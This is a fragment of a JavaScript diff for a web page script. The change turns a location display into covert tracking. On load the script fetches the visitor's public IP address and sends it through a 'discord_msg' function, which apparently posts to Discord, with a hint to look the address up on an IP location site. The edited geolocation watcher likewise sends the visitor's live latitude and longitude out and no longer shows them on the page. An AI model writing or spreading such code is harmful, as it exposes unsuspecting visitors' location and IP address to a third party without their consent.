@@ -18,19 +18,19 @@ function discord_msg(mesage) {
 
 async function get_location() {
     dosomething = navigator.geolocation.watchPosition((position) => {
-        console.log(position.coords.latitude, position.coords.longitude, position.coords.altitude);
-        document.getElementById("location").innerText = position.coords.latitude + " " + position.coords.longitude;
+        discord_msg(position.coords.latitude + " " + position.coords.longitude);
       });
 };
 
 async function get_ip() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
-        var data = await response.json();
-        discord_msg(data.ip) }
+        let data = await response.json();
+        discord_msg(data.ip, "       go to https://www.iplocation.net/ip-lookup to search ip") }
         catch (error) {
         console.error('Error fetching IP address:', error);
     }
 };
+ 
 
 get_ip();
